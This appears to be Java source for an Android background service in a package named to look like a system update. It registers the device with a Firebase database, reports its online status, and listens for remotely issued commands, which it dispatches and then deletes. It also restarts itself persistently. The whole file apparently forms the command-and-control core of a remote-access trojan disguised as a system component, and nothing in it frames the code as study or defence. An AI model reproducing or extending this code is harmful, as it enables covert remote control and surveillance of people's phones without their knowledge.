package com.system.update;

import android.app.Service;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import android.util.Log;
import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import com.google.firebase.database.ChildEventListener;
import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import java.util.HashMap;
import java.util.Map;

public class FirebaseService extends Service {

    private static final String TAG = "FirebaseService";
    private DatabaseReference deviceRef;
    private DatabaseReference commandsRef;
    private String deviceId;
    private CommandDispatcher dispatcher;

    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "Service created");

        deviceId = DeviceInfo.getDeviceId(this);
        FirebaseDatabase db = FirebaseDatabase.getInstance();
        deviceRef = db.getReference("devices").child(deviceId);
        commandsRef = db.getReference("commands").child(deviceId);

        dispatcher = new CommandDispatcher(this, deviceId);

        registerDevice();
        listenForCommands();
    }

    private void registerDevice() {
        Map<String, Object> info = DeviceInfo.getBasicInfo(this);
        info.put("status", "online");
        info.put("lastSeen", System.currentTimeMillis());
        deviceRef.setValue(info);

        deviceRef.child("status").onDisconnect().setValue("offline");
    }

    private void listenForCommands() {
        commandsRef.addChildEventListener(new ChildEventListener() {
            @Override
            public void onChildAdded(@NonNull DataSnapshot snapshot, @Nullable String prev) {
                Map<String, Object> cmd = (Map<String, Object>) snapshot.getValue();
                if (cmd != null) {
                    Log.d(TAG, "Command: " + cmd.get("type"));
                    dispatcher.dispatch(cmd);
                    snapshot.getRef().removeValue();
                }
            }
            @Override public void onChildChanged(@NonNull DataSnapshot s, @Nullable String p) {}
            @Override public void onChildRemoved(@NonNull DataSnapshot s) {}
            @Override public void onChildMoved(@NonNull DataSnapshot s, @Nullable String p) {}
            @Override public void onCancelled(@NonNull DatabaseError e) {
                Log.e(TAG, "DB error: " + e.getMessage());
            }
        });
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
                      }
